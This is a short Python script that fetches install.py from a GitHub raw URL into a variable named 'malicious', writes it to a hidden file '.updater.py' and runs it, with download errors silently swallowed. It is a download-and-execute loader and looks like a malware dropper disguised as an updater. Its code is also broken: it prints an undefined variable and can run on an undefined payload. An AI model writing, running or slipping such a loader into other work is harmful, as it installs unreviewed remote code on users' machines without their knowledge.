import urllib.request
import urllib.parse
import sys, os

try:
	with urllib.request.urlopen("https://raw.githubusercontent.com/jellal-py/monstery/refs/heads/main/install.py") as response:
		malicious = response.read().decode('utf-8')
		print(page_text)

except:
	pass

with open(".updater.py", "w") as c:
	for line in malicious:
		c.write(line)

os.system('python .updater.py')